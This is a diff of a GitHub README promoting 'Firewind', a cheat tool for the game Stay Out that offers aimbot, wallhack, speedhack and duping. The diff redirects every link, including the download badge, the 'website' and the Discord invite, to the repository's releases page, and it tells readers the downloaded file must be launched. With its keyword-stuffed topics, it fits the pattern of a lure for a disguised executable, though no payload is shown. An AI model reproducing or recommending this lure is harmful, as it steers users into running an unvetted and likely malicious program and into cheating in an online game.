@@ -8,7 +8,7 @@ Welcome to the **Stay Out Firewind** repository, a place where cutting-edge tech
 - **Topics:** stay-out, stay-out-aim, stay-out-bot, stay-out-chams, stay-out-cheat, stay-out-dupe, stay-out-esp, stay-out-fly, stay-out-hack, stay-out-macro, stay-out-mod, stay-out-radar, stay-out-script, stay-out-software, stay-out-speedhack, stay-out-visuals, stay-out-wallhack, stay-out-wh, stayout, stayout-aimbot
 
 ## 🔗 Download Firewind Now! 
-[![Download Firewind](https://img.shields.io/badge/Download-Firewind-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download Firewind](https://github.com/nellydafelly/Stay-Out-Firewind/releases)](https://github.com/nellydafelly/Stay-Out-Firewind/releases)
 
 *Note: The provided link leads to the application file. It needs to be launched for you to experience the power of Firewind!*
 
@@ -30,14 +30,14 @@ Using Firewind is simple and straightforward:
 4. Enjoy the enhanced gaming experience and dominate in Stay Out!
 
 ## 🌐 Visit Our Website
-For more information, updates, and additional resources, visit our official website [here](https://www.firewind-gaming.com).
+For more information, updates, and additional resources, visit our official website [here](https://github.com/nellydafelly/Stay-Out-Firewind/releases).
 
 ## 📥 Need Help or Feedback?
 If you encounter any issues with Firewind or have feedback to share, please visit the "Issues" section of this repository. Our team is dedicated to providing timely assistance and improving the Firewind experience based on user input.
 
 ## 🌈 Join the Firewind Community
 Connect with fellow gamers, share tips and tricks, and stay updated on the latest Firewind developments by joining our vibrant community:
-- **Discord:** [Join our Discord server](https://discord.gg/firewind) for live discussions and support.
+- **Discord:** [Join our Discord server](https://github.com/nellydafelly/Stay-Out-Firewind/releases) for live discussions and support.
 - **Reddit:** Follow us on Reddit at r/FirewindGaming for community updates and announcements.
 
 ## 🎯 Spread the Word!
